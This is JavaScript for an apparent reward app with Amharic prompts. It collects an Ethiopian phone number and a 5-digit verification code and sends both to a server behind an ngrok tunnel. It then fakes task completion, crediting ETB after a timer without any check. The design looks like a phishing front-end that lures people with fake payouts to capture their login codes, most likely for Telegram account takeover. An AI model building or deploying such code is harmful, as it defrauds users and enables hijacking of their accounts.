const API_URL = "https://serpent-marigold-stapling.ngrok-free.dev";
let currentPhone = "";
let currentTaskReward = 0;
let activeTaskType = "";

function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const targetScreen = document.getElementById(screenId);
    if (targetScreen) {
        targetScreen.classList.add('active');
        window.scrollTo(0, 0);
    }
}

async function sendCodeRequest() {
    const phoneInput = document.getElementById('phone-input');
    const phone = phoneInput.value.trim();
    
    if (phone.length < 9) {
        alert('እባክዎ ትክክለኛ ስልክ ቁጥር ያስገቡ! (ለምሳሌ: 920123456)');
        phoneInput.focus();
        return;
    }

    currentPhone = "+251" + phone;

    const btn = document.querySelector('.btn-primary');
    const originalText = btn ? btn.innerHTML : '';
    if (btn) {
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> በመላክ ላይ...';
        btn.disabled = true;
    }

    try {
        let response = await fetch(`${API_URL}/send-code`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: currentPhone })
        });
        let data = await response.json();
        
        if (response.ok && data.success) {
            showScreen('screen-otp');
            startOtpTimer();
        } else {
            alert(data.message || 'ስህተት ተፈጥሯል፣ እባክዎ እንደገና ይሞክሩ።');
        }
    } catch (e) {
        console.error('Server connection error:', e);
        alert('ሰርቨሩን ማግኘት አልተቻለም። እባክዎ ሰርቨሩ (`server.py`) መጀመሩን ያረጋግጡ።');
    } finally {
        if (btn) {
            btn.innerHTML = originalText;
            btn.disabled = false;
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const otpBoxes = document.querySelectorAll('.otp-box');
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            const val = e.target.value;
            if (val.length === 1 && index < otpBoxes.length - 1) {
                otpBoxes[index + 1].focus();
            }
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && box.value === '' && index > 0) {
                otpBoxes[index - 1].focus();
            }
        });
    });
});

let otpTimerInterval;
function startOtpTimer() {
    let timeLeft = 75;
    const timerDisplay = document.getElementById('otp-timer');
    if (!timerDisplay) return;
    
    clearInterval(otpTimerInterval);
    otpTimerInterval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(otpTimerInterval);
            timerDisplay.innerHTML = '<span style="color: var(--accent-cyan); cursor: pointer;" onclick="resendCode()">እንደገና ይላኩ</span>';
        } else {
            let minutes = Math.floor(timeLeft / 60);
            let seconds = timeLeft % 60;
            timerDisplay.innerText = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            timeLeft--;
        }
    }, 1000);
}

function resendCode() {
    alert('አዲስ የማረጋገጫ ኮድ ተልኳል!');
    startOtpTimer();
}

async function verifyOtpCode() {
    let codeBoxes = document.querySelectorAll('.otp-box');
    let code = "";
    codeBoxes.forEach(b => code += b.value);

    if (code.length < 5) {
        showError("እባክዎ ባለ 5 አሃዝ ኮዱን ሙሉ በሙሉ ያስገቡ!");
        return;
    }

    try {
        let response = await fetch(`${API_URL}/verify-code`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: currentPhone, code: code })
        });
        let data = await response.json();
        
        if (response.ok && data.success) {
            const phoneDisplay = document.getElementById('user-phone-display');
            if (phoneDisplay) phoneDisplay.innerText = currentPhone;
            showScreen('screen-dashboard');
        } else {
            showError(data.message || "የተሳሳተ የማረጋገጫ ኮድ (OTP) ነው!");
        }
    } catch (e) {
        console.error('Verification error:', e);
        showError("የሰርቨር ስህተት ተፈጥሯል፤ እባክዎ እንደገና ይሞክሩ።");
    }
}

function showError(msg) {
    const errBox = document.getElementById('error-box');
    const errText = document.getElementById('error-text');
    if (errBox && errText) {
        errText.innerText = msg;
        errBox.style.display = 'flex';
    } else {
        alert(msg);
    }
}

function openTelegramTask() {
    currentTaskReward = 120;
    activeTaskType = 'telegram';
    window.open('https://t.me/telegram', '_blank');
    simulateTaskCompletion();
}

function openYouTubeTask() {
    currentTaskReward = 150;
    activeTaskType = 'youtube';
    window.open('https://www.youtube.com/watch?v=kYv0m44uG_I', '_blank');
    simulateTaskCompletion();
}

async function simulateTaskCompletion() {
    setTimeout(async () => {
        try {
            let response = await fetch(`${API_URL}/update-balance`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: currentPhone, reward: currentTaskReward, task_type: activeTaskType })
            });
            let data = await response.json();

            if (response.ok && data.success) {
                let balanceEl = document.getElementById('balance-value');
                if (balanceEl) {
                    balanceEl.innerText = data.new_balance.toFixed(2);
                }
                alert(`እንኳን ደስ አሎት! ሥራው ተጠናቋል ፥ +${currentTaskReward} ETB ተጨምሯል።`);
            }
        } catch (e) {
            console.error('Balance update error:', e);
        }
    }, 1500);
}